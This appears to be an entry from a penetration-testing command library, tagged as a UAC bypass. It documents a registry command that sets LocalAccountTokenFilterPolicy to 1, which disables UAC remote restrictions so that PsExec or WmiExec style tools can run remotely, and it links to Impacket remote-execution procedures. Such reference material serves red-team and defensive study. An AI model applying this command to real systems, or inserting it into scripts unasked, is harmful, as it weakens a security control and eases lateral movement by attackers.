---
id: 2c4bfc2e-6668-41ce-ab11-9bb3dae30a8c
name: set-local-account-token-filter-policy
type: command
executor: cmd
data: >-
  reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v
  LocalAccountTokenFilterPolicy /t REG_DWORD /f /d 1
output: null
created_at: '2023-04-06T03:56:30.837490+00:00'
updated_at: '2023-10-10T20:37:57.936960+00:00'
platforms:
  - Windows
tags:
  - registry
  - uac-bypass
verified: true
validated: true
---

# set-local-account-token-filter-policy

## Command

```cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /f /d 1
```

## Description

This command modifies the Windows registry to set the LocalAccountTokenFilterPolicy to 1, disabling UAC remote restrictions for local admin accounts. It allows remote tools like PsExec or WmiExec to work without full elevation on non-domain or non-RID 500 accounts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System | Registry path for system policies | Yes |
| /v LocalAccountTokenFilterPolicy | Specifies the value name to set | Yes |
| /t REG_DWORD | Sets the value type to 32-bit DWORD | Yes |
| /f | Forces overwrite without prompt | Yes |
| /d 1 | Sets the value data to 1 (disable filtering) | Yes |

## Examples

### Basic Usage

```cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /f /d 1
```

### Verification

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy
```

## Expected Output

The operation completed successfully.

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
    LocalAccountTokenFilterPolicy    REG_DWORD    0x1

## Related

- [[procedures/Remote-Command-Execution-with-Impacket-Using-Credentials]]
- [[commands/impacket-psexec-execute-command]]
